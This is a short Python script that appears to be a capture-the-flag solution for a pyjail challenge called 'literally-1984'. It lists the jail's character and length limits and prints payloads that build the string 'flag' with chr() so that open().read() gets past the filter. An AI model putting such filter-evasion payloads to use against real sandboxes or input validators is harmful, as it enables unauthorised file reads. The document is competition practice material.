#!/usr/bin/env python3
# Solution for literally-1984 pyjail

# Constraints:
# - < 67 chars
# - No: space, _, \, ", ', {}, #, =
# - Only 3 audit events allowed
# - Input is evaluated in print({inp})

# Strategy: Use getattr to access functions without underscores
# Use open to read flag file

# Payload ideas:
# 1. open(chr(102)+chr(108)+chr(97)+chr(103)).read()
# 2. Use getattr to access __import__ or similar

# Most pyjails have flag.txt or flag in current directory
# We need to open and read it with minimal audit events

# Payload: open(chr(102)+chr(108)+chr(97)+chr(103)).read()
# This uses chr() to construct "flag" and then opens and reads it

payload = "open(chr(102)+chr(108)+chr(97)+chr(103)).read()"
print(f"Payload length: {len(payload)}")
print(f"Payload: {payload}")
print()

# Alternative payloads to try:
alternatives = [
    "open(chr(102)+chr(108)+chr(97)+chr(103)).read()",
    "open(chr(46)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read()",  # ./flag
    "open(chr(102)*3).read()",  # fff (unlikely but worth trying)
]

for i, alt in enumerate(alternatives, 1):
    print(f"{i}. {alt} ({len(alt)} chars)")
